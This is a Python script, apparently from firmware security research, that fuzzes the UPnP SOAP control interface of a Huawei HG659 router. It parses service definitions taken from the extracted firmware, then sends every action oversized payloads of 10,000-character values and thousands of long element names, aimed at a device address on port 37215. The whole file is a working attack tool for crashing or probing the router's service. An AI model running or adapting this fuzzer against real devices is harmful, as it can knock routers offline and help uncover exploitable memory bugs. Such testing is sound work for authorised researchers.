#!/usr/bin/python
import os
from xml.dom import minidom
from xml.dom.minidom import Document
import requests
import socket
import re

print_error = print
HTTP_TIMEOUT = 10


class HTTPClient():
    """ HTTP Client provides methods to handle communication with HTTP server """

    def __init__(self, target, port, ssl=False):
        self.target = target
        self.port = port
        self.ssl = ssl

    def http_request(self, method: str, path: str, session: requests=requests, **kwargs) -> requests.Response:
        """ Requests HTTP resource

        :param str method: method that should be issued e.g. GET, POST
        :param str path: path to the resource that should be requested
        :param requests session: session manager that should be used
        :param kwargs: kwargs passed to request method
        :return Response: Response object
        """

        if self.ssl:
            url = "https://"
        else:
            url = "http://"

        url += "{}:{}{}".format(self.target, self.port, path)

        kwargs.setdefault("timeout", HTTP_TIMEOUT)
        kwargs.setdefault("verify", False)
        kwargs.setdefault("allow_redirects", False)

        try:
            return getattr(session, method.lower())(url, **kwargs)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: {}".format(url))
        except requests.exceptions.ConnectionError:
            print_error("Connection error: {}".format(url))
        except requests.RequestException as error:
            print_error(error)
        except socket.error as err:
            print_error(err)
        except KeyboardInterrupt:
            print_error("Module has been stopped")
        return None


def get_actions(fname):
    xmldoc = minidom.parse(os.path.join(configPath, fname))
    itemlist = xmldoc.getElementsByTagName('action')
    actions = {}
    for s in itemlist:
        func_name = s.childNodes[1].firstChild.wholeText
        arguments = []
        for b in s.getElementsByTagName('argument'):
            arg_name = b.getElementsByTagName('name')[0].firstChild.wholeText
            arg_direction = b.getElementsByTagName('direction')[0].firstChild.wholeText
            relatedStateVariable = b.getElementsByTagName('relatedStateVariable')[0].firstChild.wholeText
            arguments.append({
                'name': arg_name,
                'direction': arg_direction,
                'rsv': relatedStateVariable,
            })
        actions[func_name] = arguments
    return actions


def create_body(service, function, arguments):
    doc = Document()
    # create the envelope element and set its attributes
    envelope = doc.createElementNS('', 's:Envelope')
    envelope.setAttribute('xmlns:s', 'http://schemas.xmlsoap.org/soap/envelope/')
    envelope.setAttribute('s:encodingStyle', 'http://schemas.xmlsoap.org/soap/encoding/')
    # create the body element
    body = doc.createElementNS('', 's:Body')
    # create the function element and set its attribute
    fn = doc.createElementNS('', 'u:%s' % function)
    fn.setAttribute('xmlns:u', 'urn:schemas-upnp-org:service:%s:1' % service)
    # container for created nodes
    argument_list = []
    for k in filter(lambda x: x.get('direction') != 'out', arguments):
        tmp_node = doc.createElement(k['name'])
        tmp_text_node = doc.createTextNode('A' * 10000)
        tmp_node.appendChild(tmp_text_node)
        tmp_node = doc.createElement(k['rsv'])
        tmp_text_node = doc.createTextNode('A' * 10000)
        tmp_node.appendChild(tmp_text_node)
    for x in range(5000):
        tmp_node = doc.createElement('B' * x)
        tmp_text_node = doc.createTextNode('A' * 10)
        tmp_node.appendChild(tmp_text_node)
        argument_list.append(tmp_node)
    # append the prepared argument nodes to the function element
    for arg in argument_list:
        fn.appendChild(arg)
    # append function element to the body element
    body.appendChild(fn)
    # append body element to envelope element
    envelope.appendChild(body)
    # append envelope element to document, making it the root element
    doc.appendChild(envelope)
    return doc.toxml()


def send_request(host, port, service, data, header):
    http = HTTPClient(host, port)
    response = http.http_request(
        method='POST',
        path='/ctrlu/%s_1' % service,
        data=data,
        headers=header,
    )
    if response is not None:
        print(response.status_code)
        return response.text


configPath = '/media/DATA/Work/Huawei/HG659_Telmex/jffs2-root/fs_2/etc/upnp'

UPNP = [
    {
        "name": "DeviceInfo",
        "config": "devinfo.xml",
    },
    {
        "name": "DeviceConfig",
        "config": "DevCfg.xml",
    },
    {
        "name": "Layer3Forwarding",
        "config": "L3Fwd.xml",
    },
    {
        "name": "Time",
        "config": "Time.xml",
    },
    {
        "name": "ManagementServer",
        "config": "ManagementServer.xml",
    },
    {
        "name": "LANHostConfigManagement",
        "config": "LanHostCfgMgmt.xml",
    },
    {
        "name": "Hosts",
        "config": "Host.xml",
    },
    {
        "name": "LANEthernetInterfaceConfig",
        "config": "LANEthernetInterfaceCf.xml",
    },
    {
        "name": "WLANConfiguration",
        "config": "WLANCfg.xml",
    },
    {
        "name": "WANCommonInterfaceConfig",
        "config": "WanCommonIfc1.xml",
    },
    {
        "name": "WANDSLInterfaceConfig",
        "config": "WANDSLInterfaceCf.xml",
    },
    {
        "name": "WANEthernetLinkConfig",
        "config": "WanEthLink.xml",
    },
    {
        "name": "WANDSLLinkConfig",
        "config": "WanDslLink.xml",
    },
    {
        "name": "WANPPPConnection",
        "config": "WanPppConn.xml",
    },
    {
        "name": "X_WANDeviceConfig",
        "config": "X_WANDeviceConfig.xml",
    },
]

header = {'Content-Type': 'text/xml'}
host = '192.168.100.254'
port = 37215

# Load actions
for item in UPNP:
    item['actions'] = get_actions(item['config'])
    service = item['name']
    for func in item['actions']:
        arguments = item['actions'][func]
        print('Create request for %s:%s ' % (service, func), end='')
        body = create_body(service, func, arguments)
        header['SOAPAction'] = '"urn:schemas-upnp-org:service:%s:1#%s"' % (service, func)
        text = send_request(host, port, service, body, header)
        # error = re.findall(r'<errorCode>([\d]{3})</errorCode>', text)
        # if not error:
        #     print(error[0] + ' => ' + body + '\n\n')
        # else:
        #     print(text)
